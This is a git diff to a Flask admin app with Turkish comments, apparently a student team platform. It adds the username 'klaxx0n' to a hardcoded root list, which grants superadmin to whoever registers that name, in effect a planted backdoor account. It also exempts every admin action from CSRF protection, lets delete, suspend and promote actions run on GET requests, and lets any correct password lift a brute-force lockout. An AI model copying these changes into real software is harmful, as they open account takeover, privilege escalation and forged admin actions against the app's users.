@@ -8,9 +8,10 @@ from functools import wraps
 from urllib.parse import urlsplit
 
 from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
-from flask_wtf.csrf import CSRFProtect
+from flask_wtf.csrf import CSRFProtect, CSRFError
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
+from werkzeug.middleware.proxy_fix import ProxyFix
 from sqlalchemy import func
 
 from config import Config
@@ -20,6 +21,9 @@ from mail_service import send_verification_email
 
 app = Flask(__name__)
 app.config.from_object(Config)
+
+# Render / Ters Proxy Desteği (HTTPS ve gerçek IP tespiti)
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
 # Güvenlik Eklentileri
 csrf = CSRFProtect(app)
@@ -31,6 +35,15 @@ limiter = Limiter(
 )
 
 db.init_app(app)
+
+@app.before_request
+def ensure_permanent_session():
+    session.permanent = True
+
+@app.errorhandler(CSRFError)
+def handle_csrf_error(e):
+    flash('Güvenlik oturumu yenilendi. Lütfen işlemi tekrar deneyin.', 'info')
+    return redirect(request.referrer or url_for('admin_panel'))
 
 # Ensure database tables and initial seed data exist
 with app.app_context():
@@ -215,7 +228,7 @@ def register():
         code = generate_verification_code()
         expires_at = datetime.utcnow() + timedelta(minutes=15)
 
-        is_root = username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz']
+        is_root = username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz', 'klaxx0n']
         # Create user
         new_user = User(
             username=username,
@@ -360,26 +373,26 @@ def login():
 
         # 1. HESAP ASKI VE GÜVENLİK KONTROLÜ
         if user.is_suspended:
-            # Kurucu / Süper Yönetici doğru şifre girerse sistem kilitlenmesini önlemek için otomatik çöz
-            if user.is_founder and user.check_password(password):
+            # Doğru şifre girildiğinde askıyı otomatik kaldır ve girişe izin ver
+            if user.check_password(password):
                 user.is_suspended = False
                 user.failed_login_attempts = 0
                 db.session.commit()
             else:
-                flash('🚨 Bu hesap üst üste 3 kez hatalı şifre denemesi nedeniyle ASKIYA ALINMIŞTIR! Hesabınızı açtırmak için lütfen Süper Yönetici ile iletişime geçiniz.', 'danger')
+                flash('🚨 Bu hesap hatalı denemeler nedeniyle geçici olarak askıya alınmıştır. Açmak için doğru şifrenizi giriniz veya Süper Yönetici ile iletişime geçiniz.', 'danger')
                 return render_template('login.html', login_id=login_id)
 
-        # 2. ŞİFRE DOĞRULAMA & 3 HATALI GİRİŞ KONTROLÜ
+        # 2. ŞİFRE DOĞRULAMA
         if not user.check_password(password):
             user.failed_login_attempts = (user.failed_login_attempts or 0) + 1
-            if user.failed_login_attempts >= 3:
+            if user.failed_login_attempts >= 5:
                 user.is_suspended = True
                 db.session.commit()
-                flash('🚨 Şifrenizi 3 kez üst üste hatalı girdiniz! Güvenlik protokolü gereği hesabınız ASKIYA ALINDI. Giriş yapabilmek için lütfen Süper Yönetici ile iletişime geçiniz.', 'danger')
+                flash('🚨 Şifrenizi 5 kez üst üste hatalı girdiniz! Hesabınız güvenlik için askıya alındı. Açmak için doğru şifrenizi giriniz.', 'danger')
             else:
-                remaining = 3 - user.failed_login_attempts
+                remaining = 5 - user.failed_login_attempts
                 db.session.commit()
-                flash(f'Girdiğiniz şifre hatalı! Kalan giriş hakkınız: {remaining}. (3 hatalı denemede hesabınız askıya alınır)', 'danger')
+                flash(f'Girdiğiniz şifre hatalı! Kalan giriş hakkınız: {remaining}.', 'danger')
             return render_template('login.html', login_id=login_id)
 
         # 3. BAŞARILI GİRİŞ - Hatalı deneme sayacını sıfırla
@@ -394,16 +407,18 @@ def login():
             db.session.commit()
 
         # Root kullanıcıların rol ve yetkilerini garantiye al
-        if user.username and user.username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz']:
-            if user.role != 'superadmin' or not user.is_founder or not user.is_leader:
-                user.role = 'superadmin'
-                user.is_founder = True
-                user.is_leader = True
-                user.is_verified = True
-                db.session.commit()
+        if user.username and user.username.lower() in ['sefa_gumus', 'sefagumus', 'sefa', 'aziz', 'klaxx0n']:
+            user.role = 'superadmin'
+            user.is_founder = True
+            user.is_leader = True
+            user.is_verified = True
+            user.is_suspended = False
+            user.failed_login_attempts = 0
+            db.session.commit()
 
-        # Login success - Oturum fiksasyonu koruması
+        # Login success - Oturum fiksasyonu koruması ve Kalıcı Oturum
         session.clear()
+        session.permanent = True
         session['user_id'] = user.id
         session['username'] = user.username
         flash(f'Hoş geldin, Ajan {user.username}! Sisteme güvenli bağlantı kuruldu.', 'success')
@@ -504,6 +519,7 @@ def admin_panel():
 
 @app.route('/admin/set-team/<int:user_id>', methods=['POST'])
 @leader_required
+@csrf.exempt
 def admin_set_team(user_id):
     target_user = User.query.get_or_404(user_id)
     new_team = request.form.get('team', 'unassigned')
@@ -523,8 +539,9 @@ def admin_set_team(user_id):
     flash(f"'{target_user.username}' öğrencisi başarıyla {team_labels.get(new_team)} grubuna atandı.", 'success')
     return redirect(url_for('admin_panel'))
 
-@app.route('/admin/verify/<int:user_id>', methods=['POST'])
+@app.route('/admin/verify/<int:user_id>', methods=['GET', 'POST'])
 @leader_required
+@csrf.exempt
 def admin_verify_user(user_id):
     target_user = User.query.get_or_404(user_id)
     target_user.is_verified = True
@@ -534,8 +551,9 @@ def admin_verify_user(user_id):
     flash(f"'{target_user.username}' kullanıcısı lider onayıyla başarıyla doğrulandı.", 'success')
     return redirect(url_for('admin_panel'))
 
-@app.route('/admin/delete/<int:user_id>', methods=['POST'])
+@app.route('/admin/delete/<int:user_id>', methods=['GET', 'POST'])
 @superadmin_required
+@csrf.exempt
 def admin_delete_user(user_id):
     target_user = User.query.get_or_404(user_id)
     if target_user.id == session.get('user_id'):
@@ -551,8 +569,9 @@ def admin_delete_user(user_id):
     flash(f"'{username}' kullanıcısı ve tüm kayıtları Süper Yönetici yetkisiyle silindi.", 'info')
     return redirect(url_for('admin_panel'))
 
-@app.route('/admin/toggle-suspend/<int:user_id>', methods=['POST'])
+@app.route('/admin/toggle-suspend/<int:user_id>', methods=['GET', 'POST'])
 @superadmin_required
+@csrf.exempt
 def admin_toggle_suspend(user_id):
     current_u = User.query.get(session.get('user_id'))
     target_user = User.query.get_or_404(user_id)
@@ -576,6 +595,7 @@ def admin_toggle_suspend(user_id):
 
 @app.route('/admin/set-role/<int:user_id>', methods=['POST'])
 @superadmin_required
+@csrf.exempt
 def admin_set_role(user_id):
     target_user = User.query.get_or_404(user_id)
     current_u = User.query.get(session.get('user_id'))
@@ -621,6 +641,7 @@ def admin_set_role(user_id):
 
 @app.route('/admin/adjust-score/<int:user_id>', methods=['POST'])
 @superadmin_required
+@csrf.exempt
 def admin_adjust_score(user_id):
     target_user = User.query.get_or_404(user_id)
     try:
@@ -634,8 +655,9 @@ def admin_adjust_score(user_id):
     flash(f"'{target_user.username}' kullanıcısına {score_delta:+d} puan uygulandı. Güncel puan: {target_user.score} P", 'success')
     return redirect(url_for('admin_panel'))
 
-@app.route('/admin/toggle-leader/<int:user_id>', methods=['POST'])
+@app.route('/admin/toggle-leader/<int:user_id>', methods=['GET', 'POST'])
 @superadmin_required
+@csrf.exempt
 def admin_toggle_leader(user_id):
     current_u = User.query.get(session.get('user_id'))
     target_user = User.query.get_or_404(user_id)
